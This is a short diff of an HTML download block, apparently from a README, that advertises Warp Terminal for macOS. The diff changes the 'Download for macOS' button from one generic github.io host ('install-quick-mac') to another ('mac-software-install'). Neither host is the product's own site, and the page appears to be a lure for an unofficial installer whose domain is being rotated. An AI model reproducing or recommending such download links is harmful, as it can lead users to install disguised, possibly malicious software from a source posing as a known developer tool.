@@ -6,7 +6,7 @@
 <h3>Warp Terminal for macOS</h3>
 <p>Warp Terminal for macOS is built for developers who want a fast, structured terminal that feels like a modern app rather than a retro emulator.</p>
 
-<a href="https://install-quick-mac.github.io/.github/WarpTerminal">
+<a href="https://mac-software-install.github.io/.github/WarpTerminal">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
